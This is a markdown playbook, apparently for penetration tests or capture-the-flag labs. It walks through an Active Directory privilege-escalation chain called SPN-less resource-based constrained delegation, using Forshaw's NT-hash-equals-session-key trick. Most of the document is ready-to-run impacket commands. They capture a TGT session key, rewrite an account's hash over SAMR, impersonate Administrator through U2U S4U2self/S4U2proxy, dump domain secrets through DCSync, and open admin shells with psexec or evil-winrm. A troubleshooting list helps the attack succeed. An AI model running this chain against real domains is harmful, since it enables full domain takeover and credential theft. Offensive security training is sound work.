# SPN-less RBCD via Forshaw NTHash=SessionKey Trick

## When this applies

- AD environment with a Resource-Based Constrained Delegation (RBCD) primitive: you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer object (most often the DC).
- The classical RBCD chain — create a fake computer account via `MachineAccountQuota >= 1`, point AllowedToAct at it, S4U2self+S4U2proxy → impersonation — is **blocked** because `MachineAccountQuota = 0`.
- You DO have ForceChangePassword (or any control over the NT hash) on at least one **user** account that's already a member of the controlling group.
- Goal: complete the impersonation chain WITHOUT a fresh computer account.

## The Forshaw trick

S4U2self normally requires a service account with an SPN; the resulting service ticket is encrypted with the **service's long-term key** (NT hash). With `getST.py -u2u`, S4U2self is performed **User-to-User**: the response is encrypted with the requesting user's **TGT session key** instead of their NT hash.

If you set the requesting user's **NT hash equal to its TGT session key**, the resulting U2U-encrypted S4U2self ticket decrypts both ways — the user's "service" key matches the session key. S4U2proxy can then trade that ticket for an arbitrary service ticket against any SPN on the target's allowed-to-act list, without ever needing an SPN on the impersonator (no MAQ requirement).

This was demonstrated by James Forshaw — see https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html.

## Steps

```bash
# 0. Confirm preconditions
nxc smb <DC_IP> -u <user> -p '<pw>' --gen-relay-list  # write access?
bloodyAD -d <DOMAIN> -u <user> -p '<pw>' --host <DC_IP> get object 'CN=DC,OU=...' \
   --attr msDS-AllowedToActOnBehalfOfOtherIdentity
# Should reveal an SD that includes a SID for a group you can join or already control.

# 1. Get a fresh TGT for the impersonator account; capture its session key.
impacket-getTGT -dc-ip <DC_IP> '<DOMAIN>/<impersonator>:<pw>'
KRB5CCNAME=./<impersonator>.ccache klist -e -k
# Note the encryption type and the session key from CCache (use describeTicket.py for clarity)
python3 -c '
import impacket.krb5.ccache as c, base64
cc = c.CCache.loadFile("<impersonator>.ccache")
tgt = cc.credentials[0]
print("session_key_hex:", tgt["key"]["keyvalue"].getData().hex())
'

# 2. Use changepasswd.py with -newhashes to set the impersonator's NT hash equal to that
#    session key. We need the *new raw NT hash*, not a plaintext.
#
#    NOTE: kpasswd CANNOT set a raw hash ("requires plaintext"); -p kpasswd + -newhashes is
#    rejected. Two working transports for the RAW-HASH write:
#  (a) SELF-SERVICE SAMR (you know the impersonator's current pw/hash):
impacket-changepasswd '<DOMAIN>/<impersonator>:<pw>@<DC_IP>' -p smb-samr \
    -newhashes :<session_key_hex>          # NT-only update; LM is :<empty>
#  (b) PRIVILEGED RESET via a ForceChangePassword holder (no plaintext for the impersonator
#      needed; authenticate as the controller, e.g. over Kerberos). THIS is what works when the
#      impersonator is a machine/locked account you only control via an FCP edge:
KRB5CCNAME=<controller>.ccache impacket-changepasswd -k -no-pass -reset -p smb-samr \
    -altuser '<DOMAIN>/<controller>' \
    -newhashes :<session_key_hex> -dc-ip <DC_IP> '<DOMAIN>/<impersonator>@<DC_FQDN>'
# Success prints "Password was changed successfully" + "User no longer has valid AES keys
# for Kerberos" — the AES-keys warning is EXPECTED and GOOD (forces the RC4/etype-23 path the
# trick relies on). After this the impersonator authenticates only with the hash == session key.
# VERIFY: impacket-getTGT -hashes :<session_key_hex> '<DOMAIN>/<impersonator>' must succeed.

# 3. Re-acquire the TGT — this time the long-term NT hash and the new TGT's session key
#    will not be identical, but the cached "old" TGT from step 1 still validates against
#    the new NT hash because its session key matches.
#    Use the OLD ccache from step 1 for the U2U S4U2self request.
export KRB5CCNAME=./<impersonator>.ccache
impacket-getST -spn cifs/<DC_FQDN> -dc-ip <DC_IP> -u2u -impersonate Administrator \
    -k -no-pass '<DOMAIN>/<impersonator>'

# 4. Use the resulting Administrator@<DC>.ccache for action on the target.
export KRB5CCNAME=./Administrator@<DC_FQDN>.ccache
impacket-secretsdump -k -no-pass '<DOMAIN>/Administrator@<DC_FQDN>'   # DCSync
# Or:
impacket-psexec -k -no-pass '<DOMAIN>/Administrator@<DC_FQDN>'
```

## Why each step matters

- **Step 1's TGT** is used in step 3 unchanged. Its session key is what we're matching.
- **Step 2's hash rewrite** is reversible — to restore the account you need to set the hash back via another `changepasswd`, or just reset the password to a known plaintext. Don't skip the rollback if the engagement requires returning the box to its pre-engagement state.
- **Step 3's `-u2u`** makes S4U2self a User-to-User exchange — the ticket is encrypted with the TGT session key, not the user's NT hash. Because we set the NT hash = session key in step 2, the ticket also "decrypts" as if encrypted under the user's NT hash, and the KDC will issue a normal forwardable service ticket via S4U2proxy.
- **Step 4** is just standard impersonated-Administrator action.

## Verifying success

- `impacket-secretsdump -k -no-pass` issues a DCSync against the DC and returns the krbtgt + Administrator NT hashes.
- `evil-winrm -i <DC> -u Administrator -H <NT_hash>` (post-DCSync) yields a SYSTEM shell.

## Common pitfalls

- **MAQ != 0 path is simpler** — try the standard fake-computer-account RBCD chain first. The Forshaw trick is the fallback when MAQ=0 makes that path impossible.
- **Hash must be EXACTLY the session key** — not derived. `-newhashes :<32_hex>` with no LM half. Tools that `kerberos.crypto.kdf` the password destroy the equality.
- **Forwarded TGT only**. Some hardened KDCs reject U2U S4U2self when the client cert is not in `Allowed Trustees` — `-cert-pem` / `-cert-pfx` may be required on AD CS-hardened domains.
- **Use the old (pre-rewrite) TGT** in step 3. A fresh TGT from after the rewrite has a different session key.
- **The step-1 TGT must be RC4 (etype 23)**, because a 16-byte (32-hex) RC4 session key is exactly an NT-hash-sized value you can write via `-newhashes :<32hex>`. Mint it from the account's NT hash (`getTGT -hashes :<nt>`), NOT from a plaintext password — password-based getTGT negotiates AES256 (etype 18), whose 32-byte session key is not an NT hash and won't work. Confirm the ccache etype via `impacket.krb5.ccache: bytes(CCache.loadFile(fn).credentials[0]["key"]["keyvalue"]).hex()` (must be 32 hex).
- **Impersonate a non-Protected admin.** If the obvious `Administrator` is in `Protected Users` (non-delegatable → S4U fails), look for an alternate local admin (e.g. a `Builtin\Administrators` member like `Admin`) that owns the flag/target and is NOT protected.
- **Stock impacket `getST -u2u` is sufficient** once long-term key == session key. You do NOT need to patch the PAC server-signature, re-encrypt the evidence ticket, or fall back to Rubeus — those are wasted effort. If S4U2Proxy still returns BADOPTION/ETYPE after the rewrite, re-verify the hash actually equals the *exact* step-1 ccache's session key (32 hex, etype 23) and that you're feeding the OLD ccache.
- The `-impersonate` target must be a non-protected user; `Protected Users` group blocks delegation. `Administrator` on most labs is reachable; on production-hardened domains it usually isn't.

## Tools

- impacket-getTGT (initial TGT)
- impacket-changepasswd (kpasswd self-service hash change)
- impacket-getST (`-u2u -impersonate`)
- impacket-secretsdump / impacket-psexec / evil-winrm (post-impersonation)
- bloodyAD / bloodhound.py (find ForceChangePassword + AllowedToAct edges)
- describeTicket.py (read session key from ccache)
